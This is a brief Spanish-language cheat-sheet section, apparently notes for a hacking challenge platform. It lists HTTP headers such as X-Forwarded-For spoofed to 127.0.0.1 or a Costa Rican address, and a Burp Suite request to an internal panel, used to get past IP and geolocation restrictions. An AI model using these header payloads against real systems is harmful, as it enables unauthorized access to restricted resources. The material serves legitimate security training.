## 🗺️ 3. Bypass de IP y Geolocalización (Cabeceras HTTP)

### Lista de cabeceras para probar (Simular Localhost / IP interna):


```http
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
```

### Ejemplo para simular una IP específica de Costa Rica (ej. 201.191.0.1):


```http
X-Forwarded-For: 201.191.0.1
Client-IP: 201.191.0.1
```

### Ejemplo de cómo agregarlas al final de la petición en Burp Suite:


```http
GET /panel-interno HTTP/1.1
Host: reto.hackrocks.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
```